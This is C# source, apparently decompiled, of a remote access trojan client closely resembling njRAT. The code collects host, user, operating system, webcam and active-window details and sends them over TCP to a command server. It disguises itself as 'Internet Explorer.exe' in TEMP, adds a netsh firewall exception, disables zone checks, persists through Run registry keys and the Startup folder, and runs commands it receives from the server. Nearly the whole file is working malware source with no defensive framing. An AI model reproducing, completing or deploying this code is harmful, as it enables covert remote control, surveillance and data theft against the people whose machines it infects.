//#define FM
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;

namespace XV
{
    /// class ok
    [StandardModule]
    internal sealed class OK
    {
        
        public static string VN = "KF9fX19fX19fX19fX19GS19fX19fX19fX19fX18p";
        public static string VR = "0.6.4";
        public static Mutex MT = null;
        public static string EXE = "Internet Explorer.exe";
        public static string TEMP = "TEMP";
        public static string RegKey = "3e936482e28cca4a48b713452330a269";
        public static string ip = "127.0.0.1";
        public static string port = "1177";
        public static string spliter = "|'|'|";
        public static bool BD = false;
        public static bool RunFromTemp = true;
        public static bool IsF = false;
        public static bool IsAdmin = false;
        public static FileInfo AppFileInfo = new FileInfo(Application.ExecutablePath);
        public static FileStream FS;
        public static Computer F = new Computer();
        public static string endof = "[endof]";
        internal static Process Pro;
        public static bool ON = false;
        public static string AutoRunKeyPath = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
        public static TcpClient tcp = null;
        private static MemoryStream MeM = new MemoryStream();
        private static byte[] Message = new byte[5121];

        public static string GRegValue(string n)
        {
            string result;
            try
            {
                
                result = Conversions.ToString(F.Registry.CurrentUser.OpenSubKey("Software\\" + RegKey).GetValue(n, ""));
            }
            catch (Exception expr36)
            {
                ProjectData.SetProjectError(expr36);
                result = "";
                ProjectData.ClearProjectError();
            }
            return result;
        }

        public static string Info()
        {
            string text = "lv" + spliter;
            try
            {
                if (Operators.CompareString(GRegValue("vn"), "", false) == 0)
                {
                    string arg500 = text;
                    //28 5f 5f 5f 5f 5f 5f 5f 5f 5f 5f 5f 5f 5f 46 4b (_____________FK
                   // 5f 5f 5f 5f 5f 5f 5f 5f 5f 5f 5f 5f 5f 29       _____________)


                    string text2 = FromBase64(ref VN) + "_" + Nm.HardDiskSerial();
                    text = arg500 + ToBase64(ref text2) + spliter;
                }
                else
                {
                    string arg890 = text;
                    string text2 = GRegValue("vn");
                    string text3 = FromBase64(ref text2) + "_" + Nm.HardDiskSerial();
                    text = arg890 + ToBase64(ref text3) + spliter;
                }
            }
            catch (Exception expr91)
            {
                ProjectData.SetProjectError(expr91);
                string argAc0 = text;
                string text3 = Nm.HardDiskSerial();
                text = argAc0 + ToBase64(ref text3) + spliter;
                ProjectData.ClearProjectError();
            }
            try
            {
                text = text + Environment.MachineName + spliter;
            }
            catch (Exception exprCc)
            {
                ProjectData.SetProjectError(exprCc);
                text = text + "??" + spliter;
                ProjectData.ClearProjectError();
            }
            try
            {
                text = text + Environment.UserName + spliter;
            }
            catch (Exception exprFe)
            {
                ProjectData.SetProjectError(exprFe);
                text = text + "??" + spliter;
                ProjectData.ClearProjectError();
            }
            text = text + LastWriteTime() + spliter;
            text = text + "" + spliter;
            try
            {
                text +=
                    F.Info.OSFullName.Replace("Microsoft", "")
                        .Replace("Windows", "Win")
                        .Replace("®", "")
                        .Replace("™", "")
                        .Replace("  ", " ")
                        .Replace(" Win", "Win");
            }
            catch (Exception expr_1B1)
            {
                ProjectData.SetProjectError(expr_1B1);
                text += "??";
                ProjectData.ClearProjectError();
            }
            text += "SP";
            checked
            {
                try
                {
                    string[] array = Strings.Split(Environment.OSVersion.ServicePack, " ", -1, CompareMethod.Binary);
                    if (array.Length == 1)
                    {
                        text += "0";
                    }
                    text += array[array.Length - 1];
                }
                catch (Exception expr_214)
                {
                    ProjectData.SetProjectError(expr_214);
                    text += "0";
                    ProjectData.ClearProjectError();
                }
                try
                {
                    if (Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles).Contains("x86"))
                    {
                        text = text + " x64" + spliter;
                    }
                    else
                    {
                        text = text + " x86" + spliter;
                    }
                }
                catch (Exception expr_267)
                {
                    ProjectData.SetProjectError(expr_267);
                    text += spliter;
                    ProjectData.ClearProjectError();
                }
                if (Nm.Cam())
                {
                    text = text + "Yes" + spliter;
                }
                else
                {
                    text = text + "No" + spliter;
                }
                text = text + VR + spliter;
                text = text + ".." + spliter;
                text = text + WorkedWindowsName() + spliter;
                string text4 = "";
                try
                {
                    string[] valueNames =
                        F.Registry.CurrentUser.CreateSubKey("Software\\" + RegKey, RegistryKeyPermissionCheck.Default)
                            .GetValueNames();
                    for (int i = 0; i < valueNames.Length; i++)
                    {
                        string text5 = valueNames[i];
                        if (text5.Length == 32)
                        {
                            text4 = text4 + text5 + ",";
                        }
                    }
                }
                catch (Exception expr_345)
                {
                    ProjectData.SetProjectError(expr_345);
                    ProjectData.ClearProjectError();
                }
                return text + text4;
            }
        }

        public static string LastWriteTime()
        {
            string result;
            try
            {
                result = AppFileInfo.LastWriteTime.ToString("yyyy-MM-dd");
            }
            catch (Exception expr_1A)
            {
                ProjectData.SetProjectError(expr_1A);
                result = "unknown";
                ProjectData.ClearProjectError();
            }
            return result;
        }

        public static string ToBase64(ref string s)
        {
            byte[] bytes = Encoding.UTF8.GetBytes(s);
            return Convert.ToBase64String(bytes);
        }

        public static string FromBase64(ref string s)
        {
            byte[] bytes = Convert.FromBase64String(s);
            return Encoding.UTF8.GetString(bytes);
        }

        public static byte[] GetBytes( string S)
        {
            return Encoding.Default.GetBytes(S);
        }

        public static string GetString( byte[] B)
        {
            return Encoding.Default.GetString(B);
        }

        public static Array fx(byte[] b, string spl)
        {
            var list = new List<byte[]>();
            var memoryStream = new MemoryStream();
            var memoryStream2 = new MemoryStream();
            string[] array = Strings.Split(GetString( b), spl, -1, CompareMethod.Binary);
            memoryStream.Write(b, 0, array[0].Length);
            checked
            {
                memoryStream2.Write(b, array[0].Length + spl.Length, b.Length - (array[0].Length + spl.Length));
                list.Add(memoryStream.ToArray());
                list.Add(memoryStream2.ToArray());
                memoryStream.Dispose();
                memoryStream2.Dispose();
                return list.ToArray();
            }
        }

        //* Retrieves a handle to the foreground window (the window with which the user is currently working). The system assigns a slightly higher priority to the thread that creates the foreground window than it does to other threads
        public static string WorkedWindowsName()
        {
            checked
            {
                string result;
                try
                {
                    IntPtr foregroundWindow = Nm.GetForegroundWindow();
                    if (foregroundWindow == IntPtr.Zero)
                    {
                        string text = " ";
                        result = ToBase64(ref text);
                    }
                    else
                    {
                        int windowTextLengthA = Nm.GetWindowTextLengthA((long) foregroundWindow);
                        string text2 = Strings.StrDup(windowTextLengthA + 1, "*");
                        Nm.GetWindowTextA(foregroundWindow, ref text2, windowTextLengthA + 1);
                        int num = 0;
                        Nm.GetWindowThreadProcessId(foregroundWindow, ref num);
                        if (num != 0)
                        {
                            try
                            {
                                string text = Process.GetProcessById(num).MainWindowTitle;
                                result = ToBase64(ref text);
                                return result;
                            }
                            catch (Exception expr_74)
                            {
                                ProjectData.SetProjectError(expr_74);
                                result = ToBase64(ref text2);
                                ProjectData.ClearProjectError();
                                return result;
                            }
                        }
                        result = ToBase64(ref text2);
                    }
                }
                catch (Exception expr_94)
                {
                    ProjectData.SetProjectError(expr_94);
                    string text = " ";
                    result = ToBase64(ref text);
                    ProjectData.ClearProjectError();
                }
                return result;
            }
        }

        private static bool CompDir(FileInfo F1, FileInfo F2)
        {
            if (Operators.CompareString(F1.Name.ToLower(), F2.Name.ToLower(), false) != 0)
            {
                return false;
            }
            DirectoryInfo directoryInfo = F1.Directory;
            DirectoryInfo directoryInfo2 = F2.Directory;
            while (Operators.CompareString(directoryInfo.Name.ToLower(), directoryInfo2.Name.ToLower(), false) == 0)
            {
                directoryInfo = directoryInfo.Parent;
                directoryInfo2 = directoryInfo2.Parent;
                if (directoryInfo == null & directoryInfo2 == null)
                {
                    return true;
                }
                if (directoryInfo == null)
                {
                    return false;
                }
                if (directoryInfo2 == null)
                {
                    return false;
                }
            }
            return false;
        }

        public static void Install()
        {
            if (RunFromTemp)
            {
                if (!CompDir(AppFileInfo, new FileInfo(Interaction.Environ(TEMP).ToLower() + "\\" + EXE.ToLower())))
                {
                    try
                    {
                        if (File.Exists(Interaction.Environ(TEMP) + "\\" + EXE))
                        {
                            File.Delete(Interaction.Environ(TEMP) + "\\" + EXE);
                        }


#if FM
                        File.Copy(AppFileInfo.FullName, Interaction.Environ(TEMP) + "\\" + EXE, true);
                        Process.Start(Interaction.Environ(TEMP) + "\\" + EXE);
                        ProjectData.EndApp(); 
#endif
                    }
                    catch (Exception expr_D1)
                    {
                        ProjectData.SetProjectError(expr_D1);
                        ProjectData.EndApp();
                        ProjectData.ClearProjectError();
                    }
                }
            }
            try
            {
#if FM
                Environment.SetEnvironmentVariable("SEE_MASK_NOZONECHECKS", "1", EnvironmentVariableTarget.User);
#endif
            }
            catch (Exception expr_F6)
            {
                ProjectData.SetProjectError(expr_F6);
                ProjectData.ClearProjectError();
            }
            try
            {
                Interaction.Shell(string.Concat(new[]
                {
                    "netsh firewall add allowedprogram \"",
                    AppFileInfo.FullName,
                    "\" \"",
                    AppFileInfo.Name,
                    "\" ENABLE"
                }), AppWinStyle.Hide, false, -1);
            }
            catch (Exception expr_155)
            {
                ProjectData.SetProjectError(expr_155);
                ProjectData.ClearProjectError();
            }
            if (IsAdmin)
            {
                try
                {
                    F.Registry.CurrentUser.OpenSubKey(AutoRunKeyPath, true).SetValue(RegKey, "\"" + AppFileInfo.FullName + "\" ..");
                }
                catch (Exception expr_1AC)
                {
                    ProjectData.SetProjectError(expr_1AC);
                    ProjectData.ClearProjectError();
                }
                try
                {
                    F.Registry.LocalMachine.OpenSubKey(AutoRunKeyPath, true).SetValue(RegKey, "\"" + AppFileInfo.FullName + "\" ..");
                }
                catch (Exception expr_1F9)
                {
                    ProjectData.SetProjectError(expr_1F9);
                    ProjectData.ClearProjectError();
                }
            }
            if (IsF)
            {
                try
                {
                    File.Copy(AppFileInfo.FullName,
                        Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + RegKey + ".exe", true);
                    FS =
                        new FileStream(
                            Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + RegKey + ".exe",
                            FileMode.Open);
                }
                catch (Exception expr_25F)
                {
                    ProjectData.SetProjectError(expr_25F);
                    ProjectData.ClearProjectError();
                }
            }
            Thread.Sleep(1000);
        }

        //handle recived messge

        public static bool Sendbytes(byte[] b)
        {
            if (!ON)
            {
                return false;
            }
            FileInfo lO = AppFileInfo;
            Monitor.Enter(lO);
            bool result;
            try
            {
                if (ON)
                {
                    try
                    {
                        var memoryStream = new MemoryStream();
                        memoryStream.Write(b, 0, b.Length);
                        memoryStream.Write(GetBytes( endof), 0, endof.Length);
                        tcp.Client.Send(memoryStream.ToArray(), 0, checked((int) memoryStream.Length), SocketFlags.None);
                        memoryStream.Dispose();
                       
                        return true;
                    }
                    catch (Exception expr_76)
                    {
                        ProjectData.SetProjectError(expr_76);
                        try
                        {
                            if (ON)
                            {
                                tcp.Close();
                            }
                        }
                        catch (Exception expr_90)
                        {
                            ProjectData.SetProjectError(expr_90);
                            ProjectData.ClearProjectError();
                        }
                        ON = false;
                       
                        ProjectData.ClearProjectError();
                        return false;
                    }
                }
                result = false;
            }
            finally
            {
                Monitor.Exit(lO);
            }
            return false;
        }

        public static bool Send(string S)
        {
            return Sendbytes(GetBytes( S));
        }

        public static bool connect()
        {
            FileInfo lO = AppFileInfo;
            Monitor.Enter(lO);
            bool result;
            try
            {
                try
                {
                    if (tcp != null)
                    {
                        try
                        {
                            tcp.Client.Disconnect(false);
                        }
                        catch (Exception expr_27)
                        {
                            ProjectData.SetProjectError(expr_27);
                            ProjectData.ClearProjectError();
                        }
                        try
                        {
                            tcp.Close();
                            tcp = null;
                        }
                        catch (Exception expr_47)
                        {
                            ProjectData.SetProjectError(expr_47);
                            ProjectData.ClearProjectError();
                        }
                    }
                    try
                    {
                        MeM.Dispose();
                    }
                    catch (Exception expr_61)
                    {
                        ProjectData.SetProjectError(expr_61);
                        ProjectData.ClearProjectError();
                    }
                    MeM = new MemoryStream();
                    try
                    {
                        if (Pro != null)
                        {
                            Pro.Kill();
                            Pro = null;
                        }
                    }
                    catch (Exception expr_92)
                    {
                        ProjectData.SetProjectError(expr_92);
                        ProjectData.ClearProjectError();
                    }
                }
                catch (Exception expr_A0)
                {
                    ProjectData.SetProjectError(expr_A0);
                    ProjectData.ClearProjectError();
                }
                try
                {
                    tcp = new TcpClient();
                    Thread.Sleep(1000);
                    tcp.Connect(ip, Conversions.ToInteger(port));
                    ON = true;
                    Send(Info());
                    if (!ON)
                    {
                        result = false;
                    }
                    else
                    {
                        result = true;
                    }
                }
                catch (Exception expr_FB)
                {
                    ProjectData.SetProjectError(expr_FB);
                    ON = false;
                    result = false;
                    ProjectData.ClearProjectError();
                }
            }
            finally
            {
                Monitor.Exit(lO);
            }
            return result;
        }

        public static void Listen()
        {
            checked
            {
                while (true)
                {
                    if (tcp != null)
                    {
                        try
                        {
                            while (ON)
                            {
                                if (tcp.Available > 0)
                                {
                                    Message = new byte[tcp.Client.Available - 1 + 1];
                                    int num = tcp.Client.Receive(Message, 0, Message.Length, SocketFlags.None);
                                    if (num <= 0)
                                    {
                                        break;
                                    }
                                    MeM.Write(Message, 0, num);
                                    while (true)
                                    {
                                        byte[] array = MeM.ToArray();
                                        if (!GetString( array).Contains(endof))
                                        {
                                            break;
                                        }
                                        Array array2 = fx(MeM.ToArray(), endof);
                                        var thread = new Thread(a0 => MHand.Ind((byte[]) a0));
                                        thread.Start(
                                            RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet(array2,
                                                new object[]
                                                {
                                                    0
                                                }, null)));
                                        thread.Join(200);
                                        MeM.Dispose();
                                        MeM = new MemoryStream();
                                        if (array2.Length != 2)
                                        {
                                            break;
                                        }
                                        MeM.Write((byte[]) NewLateBinding.LateIndexGet(array2, new object[]
                                        {
                                            1
                                        }, null), 0,
                                            Conversions.ToInteger(
                                                NewLateBinding.LateGet(NewLateBinding.LateIndexGet(array2, new object[]
                                                {
                                                    1
                                                }, null), null, "length", new object[0], null, null, null)));
                                    }
                                }
                                else
                                {
                                    int num2 = tcp.GetStream().ReadByte();
                                    if (num2 == -1)
                                    {
                                        break;
                                    }
                                    MeM.WriteByte((byte) num2);
                                }
                                Thread.Sleep(1);
                            }
                        }
                        catch (Exception expr_1AD)
                        {
                            ProjectData.SetProjectError(expr_1AD);
                            ProjectData.ClearProjectError();
                        }
                    }
                    IL_1C9:
                    ON = false;
                    Thread.Sleep(2500);
                    if (connect())
                    {
                        ON = true;
                        continue;
                    }
                    goto IL_1C9;
                }
            }
        }

        /* [DebuggerStepThrough, CompilerGenerated]
		private static void _Lambda$__1(object a0)
		{
			OK.Send(Conversions.ToString(a0));
		}
		[DebuggerStepThrough, CompilerGenerated]
		private static void _Lambda$__2(object sender, EventArgs e)
		{
			OK.ex();
		}
		[DebuggerStepThrough, CompilerGenerated]
		private static void _Lambda$__3(object a0)
		{
			OK.Ind((byte[])a0);
		} */
    }
}